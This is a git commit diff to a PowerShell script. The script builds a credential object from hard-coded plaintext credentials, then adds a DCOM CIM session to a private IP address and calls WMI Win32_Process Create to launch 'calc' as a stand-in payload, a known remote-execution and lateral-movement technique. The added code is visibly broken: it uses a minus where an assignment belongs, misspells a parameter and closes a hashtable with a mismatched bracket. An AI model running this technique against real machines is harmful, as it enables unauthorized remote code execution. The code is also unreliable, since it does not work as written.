b068f7bfbbd063ddd289a896fd607b34651d2c3a
8az <148684930+Stradestack@users.noreply.github.com>
2024-09-01 09:20:53 +1000

    Update New-PSCredentialObj.ps1

--- New-PSCredentialObj.ps1
+++ New-PSCredentialObj.ps1
@@ -1,5 +1,13 @@
-// Creating a PSCredential Object in powershell
+# Creating a PSCredential Object in powershell
 $username = 'stradestack';
 $password = 'stradestack';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+# Creating a new CimSession with 'calc' as payload
+$options = New-CimSessionOption -Protocol DCOM
+$session - New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SesssionOption $Options
+$command = 'calc';
+
+# Invoking the WMI session through powershell
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command];
